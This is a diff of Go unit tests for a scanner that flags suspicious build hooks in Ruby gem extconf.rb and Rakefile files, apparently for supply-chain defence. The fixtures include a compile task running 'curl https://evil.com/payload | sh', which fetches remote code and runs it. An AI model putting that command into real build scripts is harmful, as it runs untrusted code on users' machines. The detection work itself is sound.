@@ -12,7 +12,7 @@ require 'mkmf'
 system("curl https://evil.com/payload | sh")
 create_makefile('native_ext')
 `
-	s := AnalyzeRuby(extconf, "")
+	s := AnalyzeRuby(extconf, "", "")
 	if len(s.Hooks) == 0 {
 		t.Fatal("expected hooks from malicious extconf.rb")
 	}
@@ -41,16 +41,64 @@ func TestAnalyzeRubyCleanExtconf(t *testing.T) {
 require 'mkmf'
 create_makefile('my_ext')
 `
-	s := AnalyzeRuby(extconf, "")
+	s := AnalyzeRuby(extconf, "", "")
 	if len(s.Hooks) != 1 {
 		t.Fatalf("expected 1 hook (extconf.rb always has exec), got %d", len(s.Hooks))
 	}
 }
 
 func TestAnalyzeRubyEmpty(t *testing.T) {
-	s := AnalyzeRuby("", "")
+	s := AnalyzeRuby("", "", "")
 	if len(s.Hooks) != 0 {
 		t.Errorf("empty input should produce no hooks, got %d", len(s.Hooks))
+	}
+}
+
+func TestAnalyzeRubyRakefileCompileDetected(t *testing.T) {
+	rakefile := `
+require 'rake/extensiontask'
+Rake::ExtensionTask.new('native_ext') do |ext|
+  ext.lib_dir = 'lib/native_ext'
+end
+task :compile do
+  system("curl https://evil.com/payload | sh")
+end
+`
+	s := AnalyzeRuby("", "", rakefile)
+	if len(s.Hooks) != 1 {
+		t.Fatalf("expected 1 hook (Rakefile:compile), got %d", len(s.Hooks))
+	}
+	h := s.Hooks[0]
+	if h.Name != "Rakefile:compile" {
+		t.Errorf("hook name = %q, want Rakefile:compile", h.Name)
+	}
+	hasCap := func(c Capability) bool {
+		for _, cap := range h.Caps {
+			if cap == c {
+				return true
+			}
+		}
+		return false
+	}
+	if !hasCap(CapNetwork) {
+		t.Error("missing network capability")
+	}
+	if !hasCap(CapExec) {
+		t.Error("missing exec capability")
+	}
+}
+
+func TestAnalyzeRubyOrdinaryRakefileSilent(t *testing.T) {
+	rakefile := `
+require 'rake/testtask'
+task :default => :test
+Rake::TestTask.new do |t|
+  t.libs << 'test'
+end
+`
+	s := AnalyzeRuby("", "", rakefile)
+	if len(s.Hooks) != 0 {
+		t.Errorf("an ordinary Rakefile with no compile task must produce no hooks, got %d", len(s.Hooks))
 	}
 }
 
